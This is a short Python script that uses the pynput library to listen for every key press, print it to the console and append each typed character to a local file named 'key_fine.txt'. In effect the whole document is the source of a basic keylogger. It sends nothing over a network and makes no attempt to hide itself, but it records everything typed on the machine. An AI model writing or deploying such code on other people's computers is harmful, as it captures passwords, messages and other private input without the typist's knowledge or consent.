from pynput import keyboard 
def keypress(key):
    print(str(key))
    with open("key_fine.txt",'a') as logKey:
        try: 
            char =key.char 
            logKey.write(char)
        except:
            print("Error getting char")
    
if __name__=="__main__":
    listener=keyboard.Listener(on_press=keypress)
    listener.start()
    input()